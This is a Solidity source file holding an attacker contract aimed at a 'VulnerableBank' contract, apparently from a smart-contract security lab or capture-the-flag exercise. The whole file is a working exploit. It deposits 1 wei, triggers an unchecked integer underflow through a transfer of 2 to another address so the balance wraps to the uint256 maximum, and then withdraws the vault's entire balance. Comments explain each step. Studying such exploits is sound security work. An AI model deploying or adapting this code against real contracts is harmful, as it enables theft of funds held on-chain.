// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getContractBalance() external view returns (uint256);
}

contract OverflowAttacker {
    IVulnerableBank public target;

    constructor(address _target) {
        target = IVulnerableBank(_target);
    }

    // Send exactly 1 wei — deposits it, underflows balance to uint256 max, drains vault
    function attack() external payable {
        require(msg.value == 1, "Send exactly 1 wei");

        // Step 1: deposit 1 wei so balances[this] = 1
        target.deposit{value: 1}();

        // Step 2: subtract 2 from 1 in unchecked context — wraps to type(uint256).max.
        // Must transfer to a DIFFERENT address, otherwise += cancels the underflow.
        target.transfer(address(1), 2);

        // Step 3: now balances[this] == uint256.max, drain the whole vault
        uint256 vaultBalance = target.getContractBalance();
        target.withdraw(vaultBalance);
    }

    receive() external payable {}
}
